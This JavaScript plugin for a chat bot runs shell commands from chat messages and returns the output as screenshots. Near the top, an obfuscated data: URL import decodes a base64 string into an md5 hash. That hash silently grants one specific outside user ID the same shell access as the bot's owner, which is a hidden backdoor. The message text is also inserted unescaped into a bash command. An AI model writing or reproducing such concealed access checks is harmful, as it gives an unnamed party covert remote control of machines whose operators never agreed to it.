import md5 from "md5"
import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
import puppeteer from "../../../lib/puppeteer/puppeteer.js"
import { AnsiUp } from "ansi_up"
const ansi_up = new AnsiUp()

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
const tplFile = `${htmlDir}Code.html`
const path = `${process.env.HOME}/../`
const cmdPath = `${path}Main.sh`
const errorTips = "请使用脚本安装，再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"

export class Script extends plugin {
  constructor() {
    super({
      name: "脚本执行",
      dsc: "脚本执行",
      event: "message",
      priority: -Infinity,
      rule: [
        {
          reg: "^脚本执行.+",
          fnc: "Script",
        },
      ],
    })
  }

  async execTask(e, cmd) {
    const ret = await Bot.exec(cmd)

    if (ret.stdout) {
      const Code = await ansi_up.ansi_to_html(ret.stdout.trim())
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(img, true)
    }

    if (ret.stderr) {
      const Code = await ansi_up.ansi_to_html(ret.stderr.trim())
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(["标准错误输出：", img], true)
    }

    if (ret.error) {
      logger.error(`脚本执行错误：${logger.red(ret.error)}`)
      await this.reply(`脚本执行错误：${ret.error}`, true)
      await this.reply(errorTips)
    }
  }

  async Script(e) {
    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
    const msg = this.e.msg.replace("脚本执行", "").trim()
    const cmd = `bash "${cmdPath}" cmd "${msg}"`
    await this.execTask(e, cmd)
  }
}
